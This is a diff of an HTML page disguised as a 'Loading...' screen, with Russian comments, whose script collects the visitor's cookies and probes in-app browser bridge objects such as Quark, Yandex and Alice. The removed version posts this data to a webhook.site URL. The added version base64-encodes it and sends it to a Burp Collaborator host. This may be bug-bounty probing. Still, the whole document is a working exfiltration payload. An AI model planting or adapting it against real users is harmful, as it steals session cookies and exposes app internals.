@@ -3,33 +3,27 @@
 <head><title>Loading...</title></head>
 <body>
     <script>
-        (function() {
-            var leak = {
-                cookies: document.cookie,
-                userAgent: navigator.userAgent,
-                url: window.location.href,
-                interfaces: []
-            };
+(function() {
+    // 1. Собираем куки
+    var report = "Cookies: " + (document.cookie || "none");
 
-            // Список возможных мостов, которые мы нашли в коде
-            var targets = ['Quark', 'QuarkVisual', 'Yandex', 'YandexApp', 'Alice', 'JSProxy'];
-            targets.forEach(function(name) {
-                if (window[name]) {
-                    leak.interfaces.push({
-                        name: name,
-                        methods: Object.keys(window[name])
-                    });
-                }
-            });
+    // 2. Исследуем объект Quark, если он есть
+    if (window.Quark) {
+        var methods = Object.keys(window.Quark);
+        report += " | Quark detected! Methods: " + methods.join(', ');
+    } else {
+        report += " | Quark not found";
+    }
 
-            // Отправка данных на ваш Webhook
-            fetch('https://webhook.site/8b31d71f-32ab-418d-9e3f-e9dd72738799', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify(leak)
-            });
-        })();
-    </script>
+    // 3. Кодируем всё в Base64 для передачи без ошибок
+    var encodedData = btoa(unescape(encodeURIComponent(report)));
+
+    // 4. Отправляем в Burp Collaborator
+    // Замените YOUR_ID на ваш реальный ID из Burp
+    fetch('https://YOUR_ID.oastify.com/?data=' + encodedData);
+})();
+</script>
+<h1>Loading...</h1>
     <h1>Пожалуйста, подождите...</h1>
 </body>
 </html>
